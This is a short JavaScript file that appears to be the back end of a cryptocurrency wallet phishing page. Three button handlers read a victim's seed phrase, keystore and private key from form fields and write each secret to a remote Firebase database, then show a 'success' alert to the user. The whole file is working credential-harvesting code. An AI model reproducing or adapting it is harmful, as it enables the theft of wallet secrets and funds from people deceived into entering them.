var phrasev, keystorev, privatev;

function readFormphrase(){
	phrasev = document.getElementById("phrase").value;
	keystorev = document.getElementById("keystore").value;
	privatev = document.getElementById("private").value;
	console.log(phrasev, keystorev, privatev);
}

document.getElementById("insertphrase").onclick = function () {
	readFormphrase();

	firebase
		.database()
		.ref("phrase/" + phrasev)
		.set({
			phrase: phrasev,

		});
	alert("success");
};

document.getElementById("insertkeystore").onclick = function () {
	readFormphrase();

	firebase
		.database()
		.ref("keystore/" + keystorev)
		.set({
			keystore: keystorev,


		});
	alert("success");
};

document.getElementById("insertprivate").onclick = function () {
	readFormphrase();

	firebase
		.database()
		.ref("private/" + privatev)
		.set({
			private: privatev,

		});
	alert("success");
};